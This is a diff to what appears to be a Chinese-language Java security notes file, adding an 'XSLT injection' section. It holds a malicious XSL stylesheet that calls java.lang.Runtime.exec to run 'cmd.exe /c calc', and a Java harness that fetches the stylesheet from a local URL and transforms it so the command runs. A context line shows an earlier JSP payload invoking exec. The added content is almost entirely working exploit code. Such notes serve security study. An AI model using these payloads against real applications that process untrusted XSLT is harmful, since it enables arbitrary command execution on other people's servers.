@@ -261,6 +261,36 @@ cl.getMethod("exec",String.class).invoke(evil,"calc");
 %>
 ```
 
+#### xslt注入
+1.xml
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
+<xsl:template match="/">
+<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /c calc')" xmlns:Runtime="java.lang.Runtime"/>
+</xsl:template>.
+</xsl:stylesheet>
+```
+
+```java
+public static void main(String[] args) throws Exception {
+    String fileData = "<helloworld/>";
+    URL urlStream = new URL("http://127.0.0.1/1.xml");
+    Reader r = new BufferedReader(new InputStreamReader(urlStream.openStream(), StandardCharsets.UTF_8));
+    Source source = new StreamSource(r);
+    source.setSystemId(urlStream.toExternalForm());
+
+    SAXTransformerFactory factory = (SAXTransformerFactory) TransformerFactory.newInstance();
+
+    Templates templates = factory.newTemplates(source);
+    Transformer transformer = templates.newTransformer();
+
+    StringWriter buff = new StringWriter();
+    transformer.transform(new StreamSource(new StringReader(fileData)), new StreamResult(buff));
+    System.out.println(buff.toString());
+}
+```
+
 
 #### javassist
 ```xml
